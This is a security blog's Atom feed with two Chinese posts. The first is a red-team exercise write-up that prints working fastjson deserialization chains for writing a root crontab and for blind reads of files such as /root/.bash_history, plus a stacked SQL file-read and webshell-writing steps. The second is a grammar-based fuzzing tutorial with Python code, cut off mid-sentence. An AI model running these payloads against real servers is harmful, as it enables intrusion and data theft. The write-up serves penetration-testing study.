<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>RainSec</title>
  
  
  <link href="https://rainsec.cn/atom.xml" rel="self"/>
  
  <link href="https://rainsec.cn/"/>
  <updated>2022-08-24T02:53:17.845Z</updated>
  <id>https://rainsec.cn/</id>
  
  <author>
    <name>RainSec</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一次攻防小记</title>
    <link href="https://rainsec.cn/post/%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E5%B0%8F%E8%AE%B0.html"/>
    <id>https://rainsec.cn/post/%E4%B8%80%E6%AC%A1%E6%94%BB%E9%98%B2%E5%B0%8F%E8%AE%B0.html</id>
    <published>2022-08-24T10:38:45.000Z</published>
    <updated>2022-08-24T02:53:17.845Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一次攻防小记"><a href="#一次攻防小记" class="headerlink" title="一次攻防小记"></a>一次攻防小记</h1><p>​  一次攻防，第一天师傅rmi直接进了总公司内网，笔者在核心资产段打了好久没能进去，水了几天边缘分公司，队长又让打核心段，看看之前的一些弱口令，后台能不能后续利用，没办法硬着头皮打。<br>​  这个弱口令属于那种爆破可以爆破出的，但是随手试肯定不会试的，后台功能点比较多，但是生产也不敢乱动，之前师傅进后台挖过，找到了个跨目录上传和文件读取（都仅限jpg后缀），笔者经过细挖，找到个sql注入（mysql，支持堆叠，mysql用户权限较低）和fastjson（1.2.47&lt;版本&lt;1.2.68)，fatjson利用点只有两种响应，成功和失败，中间间是tomcat，不出网，然后开始尝试getshell。</p><h2 id="fastjson利用"><a href="#fastjson利用" class="headerlink" title="fastjson利用"></a>fastjson利用</h2><p>随手一试fastjson jdk8 写文件的链</p><pre><code class="json">{ "x":{        "@type":"java.lang.AutoCloseable",         "@type":"sun.rmi.server.MarshalOutputStream",        "out":{            "@type":"java.util.zip.InflaterOutputStream",            "out":{                "@type":"java.io.FileOutputStream",                "file":"/var/spool/cron/crontabs/root",                "append":false            },            "infl":{                "input":"eJzTUtCCwswUBTsF_ZLcAv2U1OJivayCdABYLgeL"            },            "bufLen":1048576        },        "protocolVersion":1    }}</code></pre><p>压缩数据生成</p><pre><code class="python">from itsdangerous import base64_decode, base64_encodeimport zlibcc='hello'.encode()ccc=zlib.compress(cc)print(base64_encode(ccc))</code></pre><p>居然成功了，写个jpg，用上面的文件读取也能读到写入的文件，当时就感觉有机会，但是苦于没有路径，然后试commons-io 发现存在依赖，尝试读文件的链子</p><pre><code class="json">{  "abc":{"@type": "java.lang.AutoCloseable",    "@type": "org.apache.commons.io.input.BOMInputStream",    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",        "url": "file:///tmp/"      },      "charsetName": "UTF-8",      "bufferSize": 1024    },"boms": [      {        "@type": "org.apache.commons.io.ByteOrderMark",        "charsetName": "UTF-8",        "bytes": [          ...        ]      }    ]  },  "address" : {"$ref":"$.abc.BOM"}}</code></pre><p>但是没有回显，无法判断，随后拜读浅蓝师傅的文章 <a href="https://b1ue.cn/archives/506.html">https://b1ue.cn/archives/506.html</a></p><p>前面读文件的链子bytes和读的文件匹配，getBOM会返回这个bytes，然后下面利用类型不匹配，让fastjson报错，服务器返回“错误”，来实现盲注读文件</p><p>通过读/root/.bash_history等拿到tomcat路径</p><pre><code class="json">{  "abc":{"@type": "java.lang.AutoCloseable",    "@type": "org.apache.commons.io.input.BOMInputStream",    "delegate": {"@type": "org.apache.commons.io.input.ReaderInputStream",      "reader": { "@type": "jdk.nashorn.api.scripting.URLReader",        "url": "file:///tmp/test"      },      "charsetName": "UTF-8",      "bufferSize": 1024    },"boms": [      {        "@type": "org.apache.commons.io.ByteOrderMark",        "charsetName": "UTF-8",        "bytes": [          98        ]      }    ]  },  "address" : {"@type": "java.lang.AutoCloseable","@type":"org.apache.commons.io.input.CharSequenceReader","charSequence": {"@type": "java.lang.String"{"$ref":"$.abc.BOM[0]"},"start": 0,"end": 0}}</code></pre><p>但是很可惜，实战环境有点复杂，经过小修改之后链子只能用来探测路径或文件是否存在，无论如何类型匹配那都不报错，笔者尝试不读文件进行对比，直接返回byte，实战环境也不报错，只能fuzz一下tomcat路径，也没fuzz出来，gg。</p><h2 id="写计划任务"><a href="#写计划任务" class="headerlink" title="写计划任务"></a>写计划任务</h2><p>试了一下写计划任务，/var/spool/cron/root写不进去，很奇怪（后来发现是队长开始写了一次，写进去了，但是语法有问题，文件不知道为啥被锁了，后来就写不进去了，覆盖追加都不行），尝试其他用户常见用户名也都失败，用mysql读了一下安装路径，发现是/home/soft ,写/var/spool/cron/soft ，也没执行，窒息.jpg。</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>fastjson没啥看了，去深入一下注入，发现可以堆叠，在secure-file-priv=NULL时，可以尝试下面这种方法读文件 ,很全的一篇mysql注入文章 <a href="https://xz.aliyun.com/t/7169#toc-32">https://xz.aliyun.com/t/7169#toc-32</a></p><pre><code class="SQL">drop table mysql.m1;CREATE TABLE mysql.m1 (code TEXT );LOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '';select * from mysql.m1;</code></pre><p>可惜还是不行，后来才知道在local_infile变量开启时候这种方法才可以读到文件，另外这站还是站库分离，mysql在阿里云上，当时竟然没测一下，浪费了不少时间，还是菜，当然这都是后话，泪.jpg。<br>到现在没得其他思路了，而且这个站已经搞了好几天了，也没搞下来，太菜了呜呜呜。</p><h2 id="二战"><a href="#二战" class="headerlink" title="二战"></a>二战</h2><p>过了两天又来日这个站，另一个师傅扫了一下目录，发现个nginx的配置文件，配置文件可以看出这个站的后台接口是被代理到另一个内网服务器，配置文件里还发现个转发服务器地址，它刚好有个druid，刚好是个弱口令，主页看到classpath，/root/soft/apache-tomcatxxxxxx（xxxxx为版本号） ,刚好这个站也有个soft用户，回去一试，/home/soft/apache-tomcatxxxxx路径存在！！！！！！！！！！！！！<br>随后就是写shell了，不知道为啥完整的shell压缩之后用fastjson写进去会报错，把shell分成几部分追加写，写文件链子里的append false改为true。<br>附一个笔者常用的在没有waf的情况下检测fastjosn的小技巧，json数据里，加上 </p><pre><code class="json">"@type":"xxxx"</code></pre><p>一般是fatjson就会报错，这次这个站就是这么发现的，后台接口很多，但是只有这一个地方的一个参数传的是json数据,也不出网。<br>小总结一下吧，端口要扫全，弱口令都要试一下，能爆破就爆破，目录该扫也要扫，毕竟渗透本质是信息收集。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一次攻防小记&quot;&gt;&lt;a href=&quot;#一次攻防小记&quot; class=&quot;headerlink&quot; title=&quot;一次攻防小记&quot;&gt;&lt;/a&gt;一次攻防小记&lt;/h1&gt;&lt;p&gt;​  一次攻防，第一天师傅rmi直接进了总公司内网，笔者在核心资产段打了好久没能进去，水了几天边缘分公司，队</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://rainsec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="https://rainsec.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Fuzzing之Grammars</title>
    <link href="https://rainsec.cn/post/Fuzzing%E4%B9%8BGrammers.html"/>
    <id>https://rainsec.cn/post/Fuzzing%E4%B9%8BGrammers.html</id>
    <published>2022-07-31T08:42:45.000Z</published>
    <updated>2022-07-31T09:15:00.140Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Fuzzing之Grammars"><a href="#Fuzzing之Grammars" class="headerlink" title="Fuzzing之Grammars"></a>Fuzzing之Grammars</h1><h2 id="Fuzzing-input"><a href="#Fuzzing-input" class="headerlink" title="Fuzzing input"></a>Fuzzing input</h2><p>​  Fuzzing的一大核心思想其实就是通过大量的Input去触发程序的各个分支逻辑，因此Fuzzing的成功与否和Input的生成关系密切。Input的格式多种多样，可以是文件，代码，json数据等等。但是各种各样的数据都有自己的格式，程序的输入也是如此，那么在生成Input的过程中，格式化非常关键，程序无法接受的输入对于Fuzzing来说是毫无意义的。</p><p>​  为了很好的描述一个程序的输入，一个很有必要的事情是为输入制定一些语法规范。比如编译器的输入：python解释器规定了符合python语法的程序才能得以执行，gcc规定了符合C语言语法的程序才能被完成编译进而生成二进制文件。Fuzzing也是如此，为了很好的达到Fuzzing的效果，为程序定义一种输入的语法规范往往是一种不错的选择。</p><p>​  一般而言，对于Fuzzing简单的程序来说，正则表达式往往是一个不错的选择，它所具备的有限状态机属性使得它易于推理进而获得一个满意的Input。但是如果面临的Fuzzing目标需要非常复杂的输入，那么它就会表现的捉襟见肘。</p><p>​  我曾见过为了更好的实现某些功能而专门设计一些语言，从计算机理论的角度这显然是非常有用的，一些特殊功能在特殊语言的加持之下表现出超高的质量，但是对于Fuzzing而言这确实是成本过高了，Grammars其实就是正则表达式和专业语言之间的一个中间地带。它易于理解，并且能很好的完成Fuzzing对它的期望–生成大量合法输入，因为通过Grammars可以规定Inputs的大量属性，完美的表达一个复杂输入的语法结构。</p><h2 id="Grammars初探"><a href="#Grammars初探" class="headerlink" title="Grammars初探"></a>Grammars初探</h2><p>​  Grammar一般由符号和一组表达式组成，例如<code>A = 10 | 9 | 0 |1</code>，符号化使得递归成为可能，假设<code>B = A | AB</code>，这无疑就使得符号所代表的范围倍增。根据这种思想我们可以制作一个算数表达式：</p><pre><code>&lt;start&gt;   ::= &lt;expr&gt;&lt;expr&gt;    ::= &lt;term&gt; + &lt;expr&gt; | &lt;term&gt; - &lt;expr&gt; | &lt;term&gt;&lt;term&gt;    ::= &lt;term&gt; * &lt;factor&gt; | &lt;term&gt; / &lt;factor&gt; | &lt;factor&gt;&lt;factor&gt;  ::= +&lt;factor&gt; | -&lt;factor&gt; | (&lt;expr&gt;) | &lt;integer&gt; | &lt;integer&gt;.&lt;integer&gt;&lt;integer&gt; ::= &lt;digit&gt;&lt;integer&gt; | &lt;digit&gt;&lt;digit&gt;   ::= 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9</code></pre><p>那么通过对<code>&lt;start&gt;</code>的内部的符号进行逐一扩展，并对过程进行随机化处理，最终就可以得到大量的合法算数表达式。和大多数语法一样，Grammar也应该有自己的Type，以便对其合法性进行校验，以Python 为例子可以对上述的Grammar进行定义：</p><pre><code class="python">    Option = Dict[str, Any]    Expansion = Union[str, Tuple[str, Option]]    Grammar = Dict[str, List[Expansion]]    EXPR_GRAMMAR: Grammar = {        "&lt;start&gt;":            ["&lt;expr&gt;"],        "&lt;expr&gt;":            ["&lt;term&gt; + &lt;expr&gt;", "&lt;term&gt; - &lt;expr&gt;", "&lt;term&gt;"],        "&lt;term&gt;":            ["&lt;factor&gt; * &lt;term&gt;", "&lt;factor&gt; / &lt;term&gt;", "&lt;factor&gt;"],        "&lt;factor&gt;":            ["+&lt;factor&gt;",            "-&lt;factor&gt;",            "(&lt;expr&gt;)",            "&lt;integer&gt;.&lt;integer&gt;",            "&lt;integer&gt;"],        "&lt;integer&gt;":            ["&lt;digit&gt;&lt;integer&gt;", "&lt;digit&gt;"],        "&lt;digit&gt;":            ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]    }</code></pre><p>前三行代码定义了一个Grammar应该如何在Python中构成。通过代码中的<code>EXPR_GRAMMAR["&lt;digit&gt;"]</code>可以访问当前Grammar的各个组成部分并对其进行操作。</p><h3 id="Sample-Grammar-Fuzz"><a href="#Sample-Grammar-Fuzz" class="headerlink" title="Sample Grammar Fuzz"></a>Sample Grammar Fuzz</h3><p>​  那么该如何对Grammar语法进行解析呢？一种最简单的方式就是通过字符串替换，因为在Grammar中<code>:</code>的左右两侧本身就是一种映射关系，因此利用字符串替换不断迭代是一种最为直观的选择。</p><p>实例代码：</p><pre><code class="python">START_SYMBOL = "&lt;start&gt;"# 一个简单的gramar fuzzerdef simple_grammar_fuzzer(grammar: Grammar,                           start_symbol: str = START_SYMBOL,                          max_nonterminals: int = 10,                          max_expansion_trials: int = 100,                          log: bool = False) -&gt; str:    """Produce a string from `grammar`.       `start_symbol`: use a start symbol other than `&lt;start&gt;` (default).       `max_nonterminals`: the maximum number of nonterminals          still left for expansion       `max_expansion_trials`: maximum # of attempts to produce a string       `log`: print expansion progress if True"""    term = start_symbol    expansion_trials = 0    while len(nonterminals(term)) &gt; 0: # 判断字符串中是否存在&lt;&gt;，并返回所有被&lt;&gt;包裹的项，注意如果是&lt;dsad&lt;abc&gt;&gt;则返回&lt;abc&gt;        symbol_to_expand = random.choice(nonterminals(term))        expansions = grammar[symbol_to_expand]        expansion = random.choice(expansions)        # In later chapters, we allow expansions to be tuples,        # with the expansion being the first element        if isinstance(expansion, tuple):            expansion = expansion[0]        new_term = term.replace(symbol_to_expand, expansion, 1) # 解析下一个符号        if len(nonterminals(new_term)) &lt; max_nonterminals: # 每次的可解析符号，必须少于最大单次解析量            term = new_term            if log:                print("%-40s" % (symbol_to_expand + " -&gt; " + expansion), term)            expansion_trials = 0        else:            expansion_trials += 1            if expansion_trials &gt;= max_expansion_trials: # 总的解析次数也存在限制                raise ExpansionError("Cannot expand " + repr(term))    return term</code></pre><p>利用上面的表达式Grammar可以制作一个简单的grammar fuzz，Fuzz的编写过程其实面临着很多的取舍，便利和速度或者各种各样的可行性之间的考虑，以上面的Grammar为例子，我们肯定不希望其陷入类似无限递归或者大量符号解析的情况，而是会限制对字段的提取次数和对符号的解析次数。</p><p>​  但是此类Grammar Fuzz都面临几个问题就是大量的字符串搜索和替换操作导致效率低下，而且可以看出存在Input生成失败的情况（ExpansionError），而且这是一个典型的上下文无关的Fuzz。不过，依赖于上述功能，我们只要编写Grammar就可以很好的对一些Inputs进行大量生成。</p><p>比如URL生成：</p><pre><code class="python">URL_GRAMMAR: Grammar = {    "&lt;start&gt;":        ["&lt;url&gt;"],    "&lt;url&gt;":        ["&lt;scheme&gt;://&lt;authority&gt;&lt;path&gt;&lt;query&gt;"],    "&lt;scheme&gt;":        ["http", "https", "ftp", "ftps"],    "&lt;authority&gt;":        ["&lt;host&gt;", "&lt;host&gt;:&lt;port&gt;", "&lt;userinfo&gt;@&lt;host&gt;", "&lt;userinfo&gt;@&lt;host&gt;:&lt;port&gt;"],    "&lt;host&gt;":  # 大部分情况下其实可以指定一个URL        ["cispa.saarland", "www.google.com", "fuzzingbook.com"],    "&lt;port&gt;":        ["80", "8080", "&lt;nat&gt;"],    "&lt;nat&gt;":        ["&lt;digit&gt;", "&lt;digit&gt;&lt;digit&gt;"],    "&lt;digit&gt;":        ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"],    "&lt;userinfo&gt;":  # Just one        ["user:password"],    "&lt;path&gt;":  # Just a few        ["", "/", "/&lt;id&gt;"],    "&lt;id&gt;":  # Just a few        ["abc", "def", "x&lt;digit&gt;&lt;digit&gt;"],    "&lt;query&gt;":        ["", "?&lt;params&gt;"],    "&lt;params&gt;":        ["&lt;param&gt;", "&lt;param&gt;&amp;&lt;params&gt;"],    "&lt;param&gt;":  # Just a few        ["&lt;id&gt;=&lt;id&gt;", "&lt;id&gt;=&lt;nat&gt;"],}</code></pre><p>或者类似HTTP协议的（但是这个不是为上述Fuzz准备的，只是拿来做个参考）：</p><pre><code class="python">{    "&lt;A&gt;": [["&lt;START_LINE&gt;", "\r\n", "&lt;HEADERS&gt;", "&lt;BODY&gt;", "\r\n\r\n"]],        "&lt;START_LINE&gt;": [["&lt;METHOD&gt;", " ", "&lt;URI&gt;", " ", "&lt;VERSION&gt;"]],        "&lt;METHOD&gt;": [["GET"], ["HEAD"], ["POST"], ["PUT"], ["DELETE"], ["CONNECT"], ["OPTIONS"], ["TRACE"], ["PATCH"], ["ACL"], ["BASELINE-CONTROL"], ["BIND"], ["CHECKIN"], ["CHECKOUT"], ["COPY"], ["LABEL"], ["LINK"], ["LOCK"], ["MERGE"], ["MKACTIVITY"], ["MKCALENDAR"], ["MKCOL"], ["MKREDIRECTREF"], ["MKWORKSPACE"], ["MOVE"], ["ORDERPATCH"], ["PRI"], ["PROPFIND"], ["PROPPATCH"], ["REBIND"], ["REPORT"], ["SEARCH"], ["UNBIND"], ["UNCHECKOUT"], ["UNLINK"], ["UNLOCK"], ["UPDATE"], ["UPDATEREDIRECTREF"], ["VERSION-CONTROL"]],        "&lt;URI&gt;": [["&lt;SCHEME&gt;" , ":", "&lt;HIER&gt;", "&lt;QUERY&gt;", "&lt;FRAGMENT&gt;"]],        "&lt;SCHEME&gt;": [["http"], ["https"], ["shttp"], ["dav"], ["about"], ["attachment"], ["cid"], ["data"], ["file"], ["ftp"], ["ssh"], ["sip"]],        "&lt;HIER&gt;": [["//", "&lt;AUTHORITY&gt;", "&lt;PATH&gt;"]],        "&lt;AUTHORITY&gt;": [["&lt;USERINFO&gt;", "&lt;HOST&gt;"]],    "&lt;PATH&gt;": [["/", "&lt;DIR&gt;"]],    "&lt;DIR&gt;": [[], ["&lt;CHAR&gt;", "/", "&lt;DIR&gt;"]],        "&lt;USERINFO&gt;": [[], ["&lt;CHAR&gt;", ":", "&lt;CHAR&gt;", "@"]],        "&lt;HOST&gt;": [["127.0.0.1:8080"]],        "&lt;QUERY&gt;": [[], ["?", "&lt;CHAR&gt;" , "=", "&lt;CHAR&gt;"]],        "&lt;FRAGMENT&gt;": [[], ["#", "&lt;CHAR&gt;"]],    "&lt;VERSION&gt;": [["HTTP/0.9"], ["HTTP/1.0"], ["HTTP/1.1"], ["HTTP/2.0"], ["HTTP/3.0"]],        "&lt;HEADERS&gt;": [[], ["&lt;HEADER&gt;", "\r\n", "&lt;HEADERS&gt;"]],        "&lt;HEADER&gt;": [["&lt;HEADER_FIELD&gt;", ": ", "&lt;ANY&gt;"]],        "&lt;HEADER_FIELD&gt;": [["A-IM"], ["Accept"], ["Accept-Charset"], ["Accept-Datetime"], ["Accept-Encoding"], ["Accept-Language"], ["Access-Control-Request-Method"], ["Access-Control-Request-Headers"], ["Authorization"], ["Cache-Control"], ["Connection"], ["Content-Encoding"], ["Content-Length"], ["Content-MD5"], ["Content-Type"], ["Cookie"], ["Date"], ["Expect"], ["Forwarded"], ["From"], ["Host"], ["HTTP2-Settings"], ["If-Match"], ["If-Modified-Since"], ["If-None-Match"], ["If-Range"], ["If-Unmodified-Since"], ["Max-Forwards"], ["Origin"], ["Pragma"], ["Proxy-Authorization"], ["Range"], ["Referer"], ["TE"], ["Trailer"], ["Transfer-Encoding"], ["User-Agent"], ["Upgrade"], ["Via"], ["Warning"]],        "&lt;BODY&gt;": [[], ["&lt;CHAR&gt;"]],        "&lt;ANY&gt;": [[], ["&lt;DATE&gt;"], ["&lt;CHAR&gt;"], ["&lt;HOST&gt;"], ["&lt;URI&gt;"]],        "&lt;DATE&gt;": [["Sat, 29 Oct 1994 19:43:31 GMT"]],        "&lt;CHAR&gt;": [["0"], ["1"], ["2"], ["3"], ["4"], ["5"], ["6"], ["7"], ["8"], ["9"], ["a"], ["b"], ["c"], ["d"], ["e"], ["f"], ["g"], ["h"], ["i"], ["j"], ["k"], ["l"], ["m"], ["n"], ["o"], ["p"], ["q"], ["r"], ["s"], ["t"], ["u"], ["v"], ["w"], ["x"], ["y"], ["z"], ["A"], ["B"], ["C"], ["D"], ["E"], ["F"], ["G"], ["H"], ["I"], ["J"], ["K"], ["L"], ["M"], ["N"], ["O"], ["P"], ["Q"], ["R"], ["S"], ["T"], ["U"], ["V"], ["W"], ["X"], ["Y"], ["Z"]]}</code></pre><p>到此，我们理解了Grammar对于Fuzzing的重要性，一个杰出的Grammar能够有效的生成大量合法输入，不过这只是从输入组成（句法）来看，这毕竟是一个庞大的范围，虽然有时候满足程序的输入格式，但是未必真的对Fuzzing起作用，这种情况非常常见。再一次以编译器为例子，你的程序在满足语言语法的同时更应该具备正确的语义。但是语义很难再以Grammar的形式表达。以URL生成Grammar为例，简单通过Grammar很难定义端口的范围。面对这样的问题，最简单的解决办法其实就是在Fuzz里面而不是在Grammar里面进行限制。以URL Grammar为例，通过Grammar生成的URL在真正的被作为Input给予目标之前，应该在Fuzz系统里面经过URL“合法性”判断，这里的判断可以由作者根据自己的需求来进行限制。</p><h3 id="Grammar-Toolbox"><a href="#Grammar-Toolbox" class="headerlink" title="Grammar Toolbox"></a>Grammar Toolbox</h3><p>​  在Fuzzing项目中对于Grammar的需求并不是一成不变的，因此Grammar的一大需求就是具备可扩展性。以一个简单的Gramar为例：</p><pre><code class="python">simple_nonterminal_grammar: Grammar = {    "&lt;start&gt;": ["&lt;nonterminal&gt;"],    "&lt;nonterminal&gt;": ["&lt;left-angle&gt;&lt;identifier&gt;&lt;right-angle&gt;"],    "&lt;left-angle&gt;": ["&lt;"],    "&lt;right-angle&gt;": ["&gt;"],    "&lt;identifier&gt;": ["id"]  # for now}</code></pre><p>有时候我们希望拓展其功能，但是不希望原来的Grammar受到影响（类比编程中的继承）,就是一个很简单的如下操作。</p><pre><code class="python">nonterminal_grammar = copy.deepcopy(simple_nonterminal_grammar)nonterminal_grammar["&lt;identifier&gt;"] = ["&lt;idchar&gt;", "&lt;identifier&gt;&lt;idchar&gt;"]nonterminal_grammar["&lt;idchar&gt;"] = ['a', 'b', 'c', 'd']  # for now</code></pre><p>总结为一个函数如下，非常简单就不多解释：</p><pre><code class="python">def set_opts(grammar: Grammar, symbol: str, expansion: Expansion,              opts: Option = {}) -&gt; None:    """Set the options of the given expansion of grammar[symbol] to opts"""    expansions = grammar[symbol]    for i, exp in enumerate(expansions):        if exp_string(exp) != exp_string(expansion):            continue        new_opts = exp_opts(exp)        if opts == {} or new_opts == {}:            new_opts = opts        else:            for key in opts:                new_opts[key] = opts[key]        if new_opts == {}:            grammar[symbol][i] = exp_string(exp)        else:            grammar[symbol][i] = (exp_string(exp), new_opts)        return    raise KeyError(        "no expansion " +        repr(symbol) +        " -&gt; " +        repr(            exp_string(expansion)))</code></pre><p>同时，在写Fuzz的时候肯定不希望不断地写大量的符号和值的对应，因此我们需要一些语法来帮助，这里提供了ENBF的解析方法：</p><pre><code class="python"># 解析 ebnf 语法def new_symbol(grammar: Grammar, symbol_name: str = "&lt;symbol&gt;") -&gt; str:    """Return a new symbol for `grammar` based on `symbol_name`"""    if symbol_name not in grammar:        return symbol_name    count = 1    while True:        tentative_symbol_name = symbol_name[:-1] + "-" + repr(count) + "&gt;"        if tentative_symbol_name not in grammar:            return tentative_symbol_name        count += 1# 提取表达式中符合EBNF语法的部分，? , * , + , ()def parenthesized_expressions(expansion: Expansion) -&gt; List[str]:    RE_PARENTHESIZED_EXPR = re.compile(r'\([^()]*\)[?+*]')    # In later chapters, we allow expansions to be tuples,    # with the expansion being the first element    if isinstance(expansion, tuple):        expansion = expansion[0]    return re.findall(RE_PARENTHESIZED_EXPR, expansion)# 对Grammar中的EBNF语法括号进行解析def convert_ebnf_parentheses(ebnf_grammar: Grammar) -&gt; Grammar:    """Convert a grammar in extended BNF to BNF"""    grammar = extend_grammar(ebnf_grammar)    for nonterminal in ebnf_grammar:        expansions = ebnf_grammar[nonterminal]        for i in range(len(expansions)):            expansion = expansions[i]            if not isinstance(expansion, str):                expansion = expansion[0]            while True:                parenthesized_exprs = parenthesized_expressions(expansion)                if len(parenthesized_exprs) == 0:                    break                for expr in parenthesized_exprs:                    operator = expr[-1:]                    contents = expr[1:-2]                    new_sym = new_symbol(grammar)                    exp = grammar[nonterminal][i]                    opts = None                    if isinstance(exp, tuple):                        (exp, opts) = exp                    assert isinstance(exp, str)                    expansion = exp.replace(expr, new_sym + operator, 1)                    if opts:                        grammar[nonterminal][i] = (expansion, opts)                    else:                        grammar[nonterminal][i] = expansion                    grammar[new_sym] = [contents]    return grammar# ENBF符号扩展def extended_nonterminals(expansion: Expansion) -&gt; List[str]:    RE_EXTENDED_NONTERMINAL = re.compile(r'(&lt;[^&lt;&gt; ]*&gt;[?+*])')    # In later chapters, we allow expansions to be tuples,    # with the expansion being the first element    if isinstance(expansion, tuple):        expansion = expansion[0]    return re.findall(RE_EXTENDED_NONTERMINAL, expansion)# ENBF符号扩展def convert_ebnf_operators(ebnf_grammar: Grammar) -&gt; Grammar:    """Convert a grammar in extended BNF to BNF"""    grammar = extend_grammar(ebnf_grammar)    for nonterminal in ebnf_grammar:        expansions = ebnf_grammar[nonterminal]        for i in range(len(expansions)):            expansion = expansions[i]            extended_symbols = extended_nonterminals(expansion)            for extended_symbol in extended_symbols:                operator = extended_symbol[-1:]                original_symbol = extended_symbol[:-1]                assert original_symbol in ebnf_grammar, \                    f"{original_symbol} is not defined in grammar"                new_sym = new_symbol(grammar, original_symbol)                exp = grammar[nonterminal][i]                opts = None                if isinstance(exp, tuple):                    (exp, opts) = exp                assert isinstance(exp, str)                new_exp = exp.replace(extended_symbol, new_sym, 1)                if opts:                    grammar[nonterminal][i] = (new_exp, opts)                else:                    grammar[nonterminal][i] = new_exp                if operator == '?':                    grammar[new_sym] = ["", original_symbol]                elif operator == '*':                    grammar[new_sym] = ["", original_symbol + new_sym]                elif operator == '+':                    grammar[new_sym] = [                        original_symbol, original_symbol + new_sym]    return grammardef convert_ebnf_grammar(ebnf_grammar: Grammar) -&gt; Grammar:    return convert_ebnf_operators(convert_ebnf_parentheses(ebnf_grammar))</code></pre><p>对于Grammar来言，我们必须要确定它的一个合法性，不然在使用中必然会遇到各种错误问题，因此语法检查是很必要的，就如同编译器的语法检查很重要一样：</p><pre><code class="python"># 搜索Grammar中的定义的noterminaldef def_used_nonterminals(grammar: Grammar, start_symbol:                           str = START_SYMBOL) -&gt; Tuple[Optional[Set[str]],                                                        Optional[Set[str]]]:    """Return a pair (`defined_nonterminals`, `used_nonterminals`) in `grammar`.    In case of error, return (`None`, `None`)."""    defined_nonterminals = set()    used_nonterminals = {start_symbol}    for defined_nonterminal in grammar:        defined_nonterminals.add(defined_nonterminal)        expansions = grammar[defined_nonterminal]        if not isinstance(expansions, list):            print(repr(defined_nonterminal) + ": expansion is not a list",                  file=sys.stderr)            return None, None        if len(expansions) == 0:            print(repr(defined_nonterminal) + ": expansion list empty",                  file=sys.stderr)            return None, None        for expansion in expansions:            if isinstance(expansion, tuple):                expansion = expansion[0]            if not isinstance(expansion, str):                print(repr(defined_nonterminal) + ": "                      + repr(expansion) + ": not a string",                      file=sys.stderr)                return None, None            for used_nonterminal in nonterminals(expansion):                used_nonterminals.add(used_nonterminal)    return defined_nonterminals, used_nonterminalsdef reachable_nonterminals(grammar: Grammar,                           start_symbol: str = START_SYMBOL) -&gt; Set[str]:    reachable = set()    def _find_reachable_nonterminals(grammar, symbol):        nonlocal reachable        reachable.add(symbol)        for expansion in grammar.get(symbol, []):            for nonterminal in nonterminals(expansion):                if nonterminal not in reachable:                    _find_reachable_nonterminals(grammar, nonterminal)    _find_reachable_nonterminals(grammar, start_symbol)    return reachabledef unreachable_nonterminals(grammar: Grammar,                             start_symbol=START_SYMBOL) -&gt; Set[str]:    return grammar.keys() - reachable_nonterminals(grammar, start_symbol)def opts_used(grammar: Grammar) -&gt; Set[str]:    used_opts = set()    for symbol in grammar:        for expansion in grammar[symbol]:            used_opts |= set(exp_opts(expansion).keys())    return used_opts# Grammar的合法性判断，类似于编译器里面的语法检查def is_valid_grammar(grammar: Grammar,                     start_symbol: str = START_SYMBOL,                      supported_opts: Set[str] = set()) -&gt; bool:    """Check if the given `grammar` is valid.       `start_symbol`: optional start symbol (default: `&lt;start&gt;`)       `supported_opts`: options supported (default: none)"""    defined_nonterminals, used_nonterminals = \        def_used_nonterminals(grammar, start_symbol)    if defined_nonterminals is None or used_nonterminals is None:        return False    # Do not complain about '&lt;start&gt;' being not used,    # even if start_symbol is different    if START_SYMBOL in grammar:        used_nonterminals.add(START_SYMBOL)    for unused_nonterminal in defined_nonterminals - used_nonterminals:        print(repr(unused_nonterminal) + ": defined, but not used",              file=sys.stderr)    for undefined_nonterminal in used_nonterminals - defined_nonterminals:        print(repr(undefined_nonterminal) + ": used, but not defined",              file=sys.stderr)    # Symbols must be reachable either from &lt;start&gt; or given start symbol    unreachable = unreachable_nonterminals(grammar, start_symbol)    msg_start_symbol = start_symbol    if START_SYMBOL in grammar:        unreachable = unreachable - \            reachable_nonterminals(grammar, START_SYMBOL)        if start_symbol != START_SYMBOL:            msg_start_symbol += " or " + START_SYMBOL    for unreachable_nonterminal in unreachable:        print(repr(unreachable_nonterminal) + ": unreachable from " + msg_start_symbol,              file=sys.stderr)    used_but_not_supported_opts = set()    if len(supported_opts) &gt; 0:        used_but_not_supported_opts = opts_used(            grammar).difference(supported_opts)        for opt in used_but_not_supported_opts:            print(                "warning: option " +                repr(opt) +                " is not supported",                file=sys.stderr)    return used_nonterminals == defined_nonterminals and len(unreachable) == 0</code></pre><p>以上列举的是常用的Tools，在Fuzz的编写过程中，要根据实际问题针对性的编写各式各样的工具。</p><h2 id="高效Grammars-Fuzz"><a href="#高效Grammars-Fuzz" class="headerlink" title="高效Grammars Fuzz"></a>高效Grammars Fuzz</h2><p>​  前面提供的simple_grammar_fuzzer其实存在大量的问题，比如性能低下，对于符号的解析次数受限，容易引起报错等，因此需要更加高明的算法。这里选择的是派生树，因为树形结构易于追踪而且易于添加和删除其中分支。关于Fuzz的编写其实就是不断的对派生树进行分析和对子节点的不断扩展。</p><h3 id="派生树算法"><a href="#派生树算法" class="headerlink" title="派生树算法"></a>派生树算法</h3><p>​  从上述的简单算法可以看出，整个的Grammar 